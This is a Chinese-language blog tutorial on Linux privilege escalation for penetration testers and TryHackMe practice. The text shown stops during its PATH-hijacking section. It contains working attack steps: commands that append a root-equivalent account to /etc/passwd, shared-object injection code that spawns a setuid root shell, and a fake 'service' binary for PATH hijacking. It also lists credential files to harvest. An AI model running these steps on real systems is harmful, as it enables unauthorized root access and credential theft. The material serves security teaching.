<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="本文將會持續更新(大概) 当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。 练习">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux提权方式">
<meta property="og:url" content="https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
<meta property="og:description" content="本文將會持續更新(大概) 当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。 练习">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586775110961.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/Linux_getsystem.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586769875679.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201127135304969.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200627_012227.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200627_012136.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200627_012712.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200511_110433.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/CVE-2019-18634-Demo-1.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200708_151735.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200623_162209.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200615_195603.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200712_215410.jpg">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200909095740510.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200909095753491.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20200909095818082.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201130100953041.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201130101625001.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220712-37:2022:35-_tfzBAG_image-20220712003735034_tfzBAG_1657557455366_tfzBAG_image-20220712003735034.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220712-32:2022:02-_wSOVyI_image-20220712003202392_wSOVyI_1657557122776_wSOVyI_image-20220712003202392.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220712-31:2022:29-_jVr10R_image-20220712003128747_jVr10R_1657557089057_jVr10R_image-20220712003128747.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220712-40:2022:04-_dKliUL_image-20220712004003859_dKliUL_1657557604187_dKliUL_image-20220712004003859.png">
<meta property="og:image" content="https://wiki.tophant.com/download/attachments/62851540/image2021-9-10_17-55-2.png?version=1&modificationDate=1631267703000&api=v2">
<meta property="og:image" content="https://wiki.tophant.com/download/attachments/62851540/image2021-9-10_17-52-24.png?version=1&modificationDate=1631267545000&api=v2">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210902-14:23:46-_xNbgbE_NBFugT_xNbgbE_1630563826338_xNbgbE_NBFugT.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210902-15:47:26-_KvUzVY_q9MC5a_KvUzVY_1630568846205_KvUzVY_q9MC5a.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20210902-14:24:53-_4gFSxZ_FASJu8_4gFSxZ_1630563893833_4gFSxZ_FASJu8.png">
<meta property="article:published_time" content="2020-04-14T01:28:41.000Z">
<meta property="article:modified_time" content="2023-10-28T17:38:24.000Z">
<meta property="article:author" content="atsud0">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="sudo">
<meta property="article:tag" content="crontab">
<meta property="article:tag" content="path">
<meta property="article:tag" content="suid">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-1586775110961.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
          
        
      
    
    <!-- title -->
    <title>Linux提权方式</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-163969429-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2020/04/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&text=Linux提权方式"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权方式"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Linux提权方式&body=Check out this article: https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权方式"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&name=Linux提权方式&description=&lt;p&gt;&lt;img src=&#34;https://images.atsud0.me/images/post/image-1586775110961.png&#34; alt=&#34;file&#34;&gt;&lt;br&gt;&lt;img src=&#34;https://images.atsud0.me/images/post/Linux_getsystem.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;本文將會持續更新(大概)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。&lt;/p&gt;
&lt;a href=&#34;https://tryhackme.com/room/linuxprivesc&#34; title=&#34;&#34; target=&#34;&#34;&gt;练习&lt;/a&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2020/04/Linux%E6%8F%90%E6%9D%83/&t=Linux提权方式"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">基础信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">信息收集脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">错误配置提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">SUID位二进制文件提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo-%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">sudo 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capabilities"><span class="toc-number">7.</span> <span class="toc-text">Capabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cron-jobs-%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">cron jobs 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83-%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">9.</span> <span class="toc-text">环境变量提权(劫持环境变量)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">内核漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%AC%AC%E4%B8%89%E6%96%B9%E7%A8%8B%E5%BA%8F"><span class="toc-number">11.</span> <span class="toc-text">其他第三方程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">12.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9"><span class="toc-number">13.</span> <span class="toc-text">隐藏痕迹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">14.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">15.</span> <span class="toc-text">参考文章</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Linux提权方式
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">atsud0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-04-14T01:28:41.000Z" class="dt-published" itemprop="datePublished">2020-04-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Note/">Note</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/crontab/" rel="tag">crontab</a>, <a class="p-category" href="/tags/path/" rel="tag">path</a>, <a class="p-category" href="/tags/sudo/" rel="tag">sudo</a>, <a class="p-category" href="/tags/suid/" rel="tag">suid</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><img src="https://images.atsud0.me/images/post/image-1586775110961.png" alt="file"><br><img src="https://images.atsud0.me/images/post/Linux_getsystem.png"></p>
<p><del>本文將會持續更新(大概)</del></p>
<p>当你在渗透过程中，你拿下的后门一开始都未必是root，一开始可能是一个较低权限的用户。这时候我们需要通过各种方式（如系统漏洞，软件缺陷）来提权，获得更高权限。</p>
<a href="https://tryhackme.com/room/linuxprivesc" title="" target="">练习</a>
<span id="more"></span>

<h2 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h2><p><img src="https://images.atsud0.me/images/post/image-1586769875679.png" alt="file"></p>
<p>提权分为横向提权(Horizontal privilege)，纵向提权(Vertical privilege)。<br>横向提权：从user1继承user2的权限这样逐步提升权限，最后再提升到root。这是横向提权。<br>纵向提权：直接从user1跨越其他用户，直接提升到root用户。</p>
<p>拿到webshell之后的起手式要做的动作</p>
<h3 id="判断发行版"><a href="#判断发行版" class="headerlink" title="判断发行版"></a>判断发行版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian based</span><br><span class="line">cat /etc/redhat-release   # Redhat based</span><br></pre></td></tr></table></figure>

<h3 id="判断内核和系统位数"><a href="#判断内核和系统位数" class="headerlink" title="判断内核和系统位数"></a>判断内核和系统位数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>

<h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ifconfig</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>

<h3 id="当前进程（最好看看root用户运行的进程"><a href="#当前进程（最好看看root用户运行的进程" class="headerlink" title="当前进程（最好看看root用户运行的进程"></a>当前进程（最好看看root用户运行的进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br><span class="line"></span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>

<h3 id="软件版本"><a href="#软件版本" class="headerlink" title="软件版本"></a>软件版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archivesO</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>



<h2 id="信息收集脚本"><a href="#信息收集脚本" class="headerlink" title="信息收集脚本"></a>信息收集脚本</h2><p>每次自动信息收集不累吗？来试试自动化信息收集脚本吧。下面的脚本有些无法在bash4.0以下运行（如LinPeas.sh)</p>
<h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h3><p>LinEnum是用于枚举本机Linux系统上的各种信息，如服务信息，系统信息，用户等。</p>
<p>下载:<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a></p>
<h3 id="LinPEAS"><a href="#LinPEAS" class="headerlink" title="LinPEAS"></a>LinPEAS</h3><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" title="" target="">Linpeas</a>

<h3 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux_Exploit_Suggester"></a>Linux_Exploit_Suggester</h3><p>漏洞利用建议</p>
<ul>
<li><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" title="" target="">Linux_Exploit_Suggester</a></li>
<li><a href="https://github.com/jondonas/linux-exploit-suggester-2" title="" target="">Linux Exploit Suggester 2</a></li>
</ul>
<h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><ul>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker" title="" target="">linuxprivchecker</a></li>
</ul>
<h3 id="lse"><a href="#lse" class="headerlink" title="lse"></a>lse</h3><ul>
<li><a href="https://github.com/diego-treitos/linux-smart-enumeration" title="" target="">lse</a></li>
</ul>
<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="配置文件信息泄露"><a href="#配置文件信息泄露" class="headerlink" title="配置文件信息泄露"></a>配置文件信息泄露</h3><p>有些服务的配置文件上面是明文写帐号密码的，一些不够严谨的系统管理员，会将部分服务的密码作为root用户的密码。</p>
<h3 id="SSH-Key私钥泄露"><a href="#SSH-Key私钥泄露" class="headerlink" title="SSH-Key私钥泄露"></a>SSH-Key私钥泄露</h3><p>ssh十分重要的两个文件</p>
<ul>
<li>id_rsa</li>
<li>id_rsa.pub</li>
</ul>
<p>id_rsa.pub会让攻击者知道你的公钥以及你的用户名<br>id_rsa则是记载私钥，攻击者获取私钥后，可暴力破解。如果私钥没有加密的话，攻击者可以直接使用私钥连接服务器。</p>
<h3 id="openvpn"><a href="#openvpn" class="headerlink" title="openvpn"></a>openvpn</h3><ul>
<li>*.ovpn (用户的连接配置文件)<br>有可能存在密钥信息或者是明文密码</li>
<li>&#x2F;etc&#x2F;openvpn&#x2F;auth.txt</li>
<li>~&#x2F;.irssi&#x2F;config</li>
</ul>
<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p>~&#x2F;.bash_history</p>
<p>这里也是找敏感信息的好地方~</p>
<h3 id="vi-x2F-vim-swp"><a href="#vi-x2F-vim-swp" class="headerlink" title="vi&#x2F;vim .swp"></a>vi&#x2F;vim .swp</h3><p>vi&#x2F;vim的恢复文件<code>.swp</code>里面有该文件的所有者的用户名，和路径信息。如果能在网站上找到这文件，或许你就能知道绝对路径和用户名了。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201127135304969.png" alt="image-20201127135304969"></p>
<h3 id="网站CMS的config-php"><a href="#网站CMS的config-php" class="headerlink" title="网站CMS的config.php"></a>网站CMS的config.php</h3><p>位置不定，一般以config.php和inc.php之类的里面会写数据库连接的用户名和密码。</p>
<h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><ul>
<li>根目录&#x2F;wordpress&#x2F;admin&#x2F;wp-config.php</li>
<li>根目录&#x2F;admin&#x2F;wp-config.php</li>
</ul>
<h2 id="错误配置提权"><a href="#错误配置提权" class="headerlink" title="错误配置提权"></a>错误配置提权</h2><h3 id="错误配置-x2F-etc-x2F-passwd"><a href="#错误配置-x2F-etc-x2F-passwd" class="headerlink" title="错误配置 &#x2F;etc&#x2F;passwd"></a>错误配置 &#x2F;etc&#x2F;passwd</h3><p>什么是<code>/etc/passwd</code>，点击<a target="_blank" rel="noopener" href="https://blog.csdn.net/a1154490629/article/details/52190801">这里</a>了解</p>
<p>如果某个用户具有<code>/etc/passwd</code>的写入权限的，那么我们可以使用这个用户，往<code>/etc/passwd</code>里面写入一个新的用户。（这不常见，一般&#x2F;etc&#x2F;passwd不会带有可写权限）<br>格式为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名:密码哈希:用户ID:组ID:备注:家目录:shell</span><br><span class="line">username:password hash:UID:GID:User ID Info:Home:command/shell</span><br></pre></td></tr></table></figure>

<p>所以如果我们要新建一个等同于root的新用户。要这么写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>要生成密码哈希值的话，需要用到<code>openssl</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt [new] [123] </span><br></pre></td></tr></table></figure>

<p>-1是生成md5加密 new字段用户名，撒盐 123指密码</p>
<p>然后直接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash&#x27; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>

<p>添加好后，虽然登陆是登陆new这个名字的用户，但是实际上是root用户，因为Linux下使用uid去识别的。</p>
<h3 id="错误配置-x2F-etc-x2F-shadow"><a href="#错误配置-x2F-etc-x2F-shadow" class="headerlink" title="错误配置 &#x2F;etc&#x2F;shadow"></a>错误配置 &#x2F;etc&#x2F;shadow</h3><p><code>/etc/shadow</code>文件存储了用户的密码哈希加密字段。如果一个低权限用户能查看这个文件，那么就可以拿这个加密过得哈希值去暴力破解得到真实密码。</p>
<h2 id="SUID位二进制文件提权"><a href="#SUID位二进制文件提权" class="headerlink" title="SUID位二进制文件提权"></a>SUID位二进制文件提权</h2><p>Linux系统中，会有部分命令的权限位是<code>rws</code>而不是<code>rwx</code>这些文件被称为SUID文件</p>
<blockquote>
<p>SUID 权限仅对二进制可执行文件有效，<br>如果执行者对于该二进制可执行文件具有x的权限，执行者将具有该文件的所有者的权限<br>本权限仅在执行该二进制可执行文件的过程中有效</p>
</blockquote>
<blockquote>
<p>The setuid and setgid flags have an effect only on binary executable files and not on scripts (e.g., Bash, Perl, Python).</p>
<p>setuid和setgid权限，只对二进制文件生效，对脚本文件不会生效。</p>
</blockquote>
<p>所以如果随意设置SUID文件，可能会导致系统很危险。<br>SGID文件同理，只不过SGID,是执行者将具有该文件的所有组权限。</p>
<p>而SBIT权限只对目录有效，SBIT对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
<p>总结一下:</p>
<ul>
<li>SUID,执行者将具有owner的权限</li>
<li>SGID,执行者将具有group的权限</li>
<li>SGIT,目录属性下用户新建的文件或目录,只有owner和root才能删除</li>
<li>SUID和SGID只有</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>这里有更多的信息：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9651622.html">SUID</a><br>这里有一个SUID提权的实例：<a href="/2020/04/14/TryHackMe-Kenobi/">kenobi</a></p>
<h3 id="SUID-exim-CVE-2016-1531-提权"><a href="#SUID-exim-CVE-2016-1531-提权" class="headerlink" title="SUID-exim-CVE-2016-1531 提权"></a>SUID-exim-CVE-2016-1531 提权</h3><p>exim &lt;&#x3D; 4.84-3</p>
<a href="https://www.exploit-db.com/exploits/39535" title="" target="">exploit利用</a>

<h3 id="SUID-nginx-CVE-2016-1247-提权"><a href="#SUID-nginx-CVE-2016-1247-提权" class="headerlink" title="SUID nginx CVE-2016-1247 提权"></a>SUID nginx CVE-2016-1247 提权</h3><p><a target="_blank" rel="noopener" href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">漏洞信息和EXP</a></p>
<p>要求:</p>
<ul>
<li>拿到www-data用户权限</li>
<li>nginx &lt; 1.10.2-r3</li>
</ul>
<p>执行exp后</p>
<p>等待第二天6点工作排程更新。获取root权限</p>
<h3 id="SUID-suid-so-共享对象库注入"><a href="#SUID-suid-so-共享对象库注入" class="headerlink" title="SUID suid-so 共享对象库注入"></a>SUID suid-so 共享对象库注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012227.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012136.jpg"></p>
<p>可以看到有一个链接库文件在家目录的.config下，是我们可以利用的，所以。</p>
<p>在<code>~/.config</code>目录下创建一个libcalc.c文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject() &#123;    system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c</span><br></pre></td></tr></table></figure>

<p>然后执行suid-so文件。就提权了</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200627_012712.jpg"></p>
<h3 id="SUID-env提权"><a href="#SUID-env提权" class="headerlink" title="SUID env提权"></a>SUID env提权</h3><p>假设有以下两个文件suid-env,suid-env2。这两个文件具有suid位权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCM@debian:~/.config$ strings /usr/local/bin/suid-env/lib64/ld-linux-x86-64.so.25q;Xq__gmon_start__libc.so.6setresgidsetresuidsystem__libc_start_mainGLIBC_2.2.5fff.fffff.l$ Lt$(L|$0Hservice apache2 startTCM@debian:~/.config$ strings /usr/local/bin/suid-env2/lib64/ld-linux-x86-64.so.2__gmon_start__libc.so.6setresgidsetresuidsystem__libc_start_mainGLIBC_2.2.5fff.fffff.l$ Lt$(L|$0H/usr/sbin/service apache2 start</span><br></pre></td></tr></table></figure>

<p>用strings能够看到最后执行的语句是</p>
<ul>
<li>service apache2 start</li>
<li>&#x2F;usr&#x2F;sbin&#x2F;service apache2 start</li>
</ul>
<h4 id="第一种没有绝对路径的service"><a href="#第一种没有绝对路径的service" class="headerlink" title="第一种没有绝对路径的service"></a>第一种没有绝对路径的service</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#x27; &gt; /tmp/service.cgcc /tmp/service.c -o /tmp/serviceexport PATH=/tmp:$PATH/usr/local/bin/suid-env</span><br></pre></td></tr></table></figure>

